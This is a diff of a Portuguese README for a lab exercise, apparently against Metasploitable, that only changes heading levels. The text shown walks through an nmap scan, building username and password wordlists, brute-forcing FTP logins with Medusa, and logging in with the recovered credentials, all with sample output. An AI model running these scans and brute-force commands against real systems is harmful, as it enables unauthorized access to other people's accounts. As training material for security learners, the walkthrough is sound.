@@ -19,9 +19,9 @@ Este projeto tem como objetivo demonstrar a execução de ataques de força brut
 
 ## Ataques Executados
 
-### Ataque de Força Bruta FTP com Medusa
+# Ataque de Força Bruta FTP com Medusa
 
-# 1) Enumeração com nmap (portas 21,22,80,139,445)
+## 1) Enumeração com nmap (portas 21,22,80,139,445)
    
    # varre as portas específicas com detecção de versão e scripts básicos
 Comando: nmap -sV -sC -p 21,22,80,139,445 192.168.10.3 -oA nmap_metasp_ftp_scan
@@ -33,7 +33,7 @@ O que fazem os parâmetros:
 -sV → tenta descobrir versão do serviço.
 
 
-# Exemplo de saída:
+### Exemplo de saída:
 
 ──(kali㉿kali)-[~]
 └─$ nmap -sV -sC -p 21,22,80,139,445 192.168.10.3                         
@@ -59,10 +59,10 @@ PORT    STATE SERVICE     VERSION
 
 
 
- # 2) Lista de contas / senhas para teste (wordlists simples)
+ ## 2) Lista de contas / senhas para teste (wordlists simples)
 
 Crie dois arquivos (um para usuários, outro para senhas). 
-# users.txt
+### users.txt
 ┌──(kali㉿kali)-[~]
 └─$ mkdir -p ~/wordlists   
                                                                                                                                 
@@ -81,7 +81,7 @@ tom
 backup
 EOF
                                                                                                                                  
-# passwords.txt
+### passwords.txt
 cat > ~/wordlists/passwords.txt <<'EOF'
 msfadmin
 msf
@@ -95,14 +95,14 @@ guest
 ftp
 EOF
 
-# 3) Brute-force/enumeração com Medusa (FTP)
+## 3) Brute-force/enumeração com Medusa (FTP)
 
 Instalação (se necessário):
 
 sudo apt update
 sudo apt install medusa -y
 
-# Comando Medusa para FTP, usando listas criadas:
+### Comando Medusa para FTP, usando listas criadas:
 medusa -h 192.168.10.3 -U ~/wordlists/users.txt -P ~/wordlists/passwords.txt -M ftp -t 6 -f
 
 O que significam as flags:
@@ -119,7 +119,7 @@ O que significam as flags:
 
 -f → parar o ataque quando encontrar uma credencial válida para um usuário.
 
-# Exemplo de saída esperada quando encontra credenciais:
+### Exemplo de saída esperada quando encontra credenciais:
 
 ┌──(kali㉿kali)-[~/wordlists]
 └─$ medusa -h 192.168.10.3 -U ~/wordlists/users.txt -P ~/wordlists/passwords.txt -M ftp -t 6 -f
@@ -137,14 +137,14 @@ Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.n
 ┌──(kali㉿kali)-[~/wordlists]
 └─$ 
 
-# 4) Teste de conexão FTP com as credenciais encontradas
+## 4) Teste de conexão FTP com as credenciais encontradas
 
 Suponha que o medusa retornou msfadmin:msfadmin. Teste com um cliente FTP simples.
 
 Modo interativo (ftp client):
 
 Comando: ftp 192.168.10.3
-# quando pedir:
+### quando pedir:
 Name (192.168.10.3:youruser): msfadmin
 Password: msfadmin
 
